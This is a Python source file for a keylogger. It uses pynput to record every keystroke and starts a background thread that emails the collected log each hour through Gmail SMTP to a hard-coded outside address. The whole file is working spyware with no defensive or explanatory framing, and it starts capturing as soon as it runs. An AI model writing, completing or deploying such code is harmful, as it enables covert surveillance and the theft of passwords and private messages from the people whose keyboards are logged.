from pynput import keyboard
import time
import threading
import smtplib

# Class that keylogs the keyboard of the user

class Keylogger:
    def __init__(self):
        self.log = ""
        self.email = "pythondev1101@gmail.com"
        self.password = ""

    def logging(self, key):
        try:
            self.log += key.char

        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += " " + str(key) + " "

    def email_self(self):
        with smtplib.SMTP('smtp.gmail.com', 587) as mailer:
            mailer.starttls()
            mailer.ehlo()
            mailer.login(self.email, self.password)
            mailer.sendmail(self.email, "jerrellabrahams50@gmail.com", f"\n\n This is the Keyboard Logger: {self.log}")

    def preview_logged(self):
        while True:
            time.sleep(3600)
            self.email_self()
            print(self.log)
            self.log = ""

    def keylogger(self):
        with keyboard.Listener(on_press=self.logging) as listener:
            log_thread = threading.Thread(target=self.preview_logged)
            log_thread.start()
            listener.join()



keylogger = Keylogger()
keylogger.keylogger()
